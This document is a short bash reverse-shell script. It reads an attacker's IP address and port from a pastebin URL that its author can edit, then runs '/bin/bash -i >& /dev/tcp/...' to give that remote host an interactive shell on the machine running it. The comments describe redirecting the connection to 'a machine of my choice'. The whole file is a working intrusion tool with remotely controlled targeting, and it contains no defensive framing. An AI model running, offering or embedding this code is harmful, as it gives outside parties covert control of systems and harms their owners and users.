#!/bin/bash

VERBOSE=true

# The script can fetch the attacker listening IP and Port from the internet.
# I'm use pastebin here as a example.
# I can edit this paste and make the script connect to a machine of my choice.
# This is paste is set to localhost:8080.

URL=https://pastebin.com/raw/Xg47HW4M
DATA=($(curl -s -L "$URL"))

if [ "$VERBOSE" = true ]; then echo "Connecting to ${DATA[0]}:${DATA[1]}"; fi

/bin/bash -i >& /dev/tcp/${DATA[0]}/${DATA[1]} 0>&1
